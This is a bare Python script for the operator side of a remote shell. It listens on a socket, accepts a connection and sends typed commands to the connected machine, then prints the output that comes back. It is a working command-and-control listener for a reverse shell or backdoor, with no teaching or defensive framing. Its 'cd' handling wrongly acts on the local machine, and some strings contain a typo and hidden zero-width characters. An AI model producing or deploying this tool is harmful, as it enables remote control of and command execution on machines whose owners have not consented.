import socket 
import subprocess
import os


def start_server():
    host = '192.168.1.5'
    port = 12357

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print(f"Server listening on {host}:{port}")

    conn, addr = server_socket.accept()
    print(f"Connection from {addr}")

    while True:
        command = input("Enter a command (or 'exit' to close):‌")

        if command.lower() == 'exit':
            conn.send(command.encode())
            break
        elif command.startswith('cd '):
            try:
                os.chdir(command[3:])
                result = "Changed directory to " + os.getcwd() + "\nFiles in the directory:\n" + "\n".join(os.listdir())
            except Exception as e:
                result = f"Error Chaind dir:‌{str(e)}"
        else:
            conn.send(command.encode())
            result = conn.recv(4096).decode()
        print(f"Result from client:‌\n {result}")
    
    conn.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()